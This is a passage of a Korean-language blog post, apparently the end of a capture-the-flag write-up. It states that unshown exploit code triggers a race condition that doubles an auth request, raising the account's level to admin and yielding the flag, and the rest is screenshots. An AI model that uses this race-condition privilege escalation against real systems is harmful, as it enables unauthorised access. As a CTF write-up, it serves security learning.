<p><span><br/><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">-----</span><span style="color: #333333;">----</span> <br/><br/></span></p>
<p><span>위와같은<span> race condition</span>을 발생시키는 익스플로잇 코드를 통해<span> level</span>을<span> 2</span>번 증가시킬 수 있다<br/><br/></span></p>
<figure class="imageblock alignCenter" data-filename="image9.png" data-ke-mobilestyle="widthContent" data-origin-height="105" data-origin-width="523"><span data-phocus="https://blog.kakaocdn.net/dna/7g1JP/btqIOoqaKT5/AAAAAAAAAAAAAAAAAAAAAJ6bYlaWyq22Vrvwct7BXkKMY9sc7UaKVZErQ5qPLeIx/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=X8t73uQ9DV7qZgoaY6I0dymKYKk%3D" data-url="https://blog.kakaocdn.net/dna/7g1JP/btqIOoqaKT5/AAAAAAAAAAAAAAAAAAAAAJ6bYlaWyq22Vrvwct7BXkKMY9sc7UaKVZErQ5qPLeIx/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=X8t73uQ9DV7qZgoaY6I0dymKYKk%3D"><img data-filename="image9.png" data-ke-mobilestyle="widthContent" data-origin-height="105" data-origin-width="523" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/7g1JP/btqIOoqaKT5/AAAAAAAAAAAAAAAAAAAAAJ6bYlaWyq22Vrvwct7BXkKMY9sc7UaKVZErQ5qPLeIx/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=X8t73uQ9DV7qZgoaY6I0dymKYKk%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2F7g1JP%2FbtqIOoqaKT5%2FAAAAAAAAAAAAAAAAAAAAAJ6bYlaWyq22Vrvwct7BXkKMY9sc7UaKVZErQ5qPLeIx%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DX8t73uQ9DV7qZgoaY6I0dymKYKk%253D"/></span></figure>
<p><span>실제로<span> auth </span>요청이<span> 2</span>번 된것을 확인하였고<span>, </span>그 계정으로 로그인 시 </span></p>
<figure class="imageblock alignCenter" data-filename="image10.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/GK6Es/btqIJasIqLu/AAAAAAAAAAAAAAAAAAAAAN3vlie2uKDfyJYhiIA1yi9NKCWkQgJsdmtdDWkCT8jA/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=g9TXwL6%2FnWXmMfWqlWCVEK%2FuZVg%3D" data-url="https://blog.kakaocdn.net/dna/GK6Es/btqIJasIqLu/AAAAAAAAAAAAAAAAAAAAAN3vlie2uKDfyJYhiIA1yi9NKCWkQgJsdmtdDWkCT8jA/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=g9TXwL6%2FnWXmMfWqlWCVEK%2FuZVg%3D"><img data-filename="image10.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/GK6Es/btqIJasIqLu/AAAAAAAAAAAAAAAAAAAAAN3vlie2uKDfyJYhiIA1yi9NKCWkQgJsdmtdDWkCT8jA/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=g9TXwL6%2FnWXmMfWqlWCVEK%2FuZVg%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FGK6Es%2FbtqIJasIqLu%2FAAAAAAAAAAAAAAAAAAAAAN3vlie2uKDfyJYhiIA1yi9NKCWkQgJsdmtdDWkCT8jA%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3Dg9TXwL6%252FnWXmMfWqlWCVEK%252FuZVg%253D"/></span></figure>
<p><span>admin</span><span>으로 변한것을 확인할 수 있다<span>.<span> </span></span></span></p>
<figure class="imageblock alignCenter" data-filename="image11.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920"><span data-phocus="https://blog.kakaocdn.net/dna/xaXUu/btqIBNLM1DA/AAAAAAAAAAAAAAAAAAAAAC9LJS-2M5oNgo4tJI_As4bh5VOcep1KDw43RXVy1Hjl/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=Om%2F2wA%2FUbgubTyjhjUi9kjc76q0%3D" data-url="https://blog.kakaocdn.net/dna/xaXUu/btqIBNLM1DA/AAAAAAAAAAAAAAAAAAAAAC9LJS-2M5oNgo4tJI_As4bh5VOcep1KDw43RXVy1Hjl/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=Om%2F2wA%2FUbgubTyjhjUi9kjc76q0%3D"><img data-filename="image11.png" data-ke-mobilestyle="widthContent" data-origin-height="1040" data-origin-width="1920" onerror="this.onerror=null; this.src='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png'; this.srcset='//t1.daumcdn.net/tistory_admin/static/images/no-image-v1.png';" src="https://blog.kakaocdn.net/dna/xaXUu/btqIBNLM1DA/AAAAAAAAAAAAAAAAAAAAAC9LJS-2M5oNgo4tJI_As4bh5VOcep1KDw43RXVy1Hjl/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1769871599&amp;allow_ip=&amp;allow_referer=&amp;signature=Om%2F2wA%2FUbgubTyjhjUi9kjc76q0%3D" srcset="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FxaXUu%2FbtqIBNLM1DA%2FAAAAAAAAAAAAAAAAAAAAAC9LJS-2M5oNgo4tJI_As4bh5VOcep1KDw43RXVy1Hjl%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1769871599%26allow_ip%3D%26allow_referer%3D%26signature%3DOm%252F2wA%252FUbgubTyjhjUi9kjc76q0%253D"/></span></figure>
<p><span>플래그 획득</span></p>
</td>
</tr>
</tbody>
</table>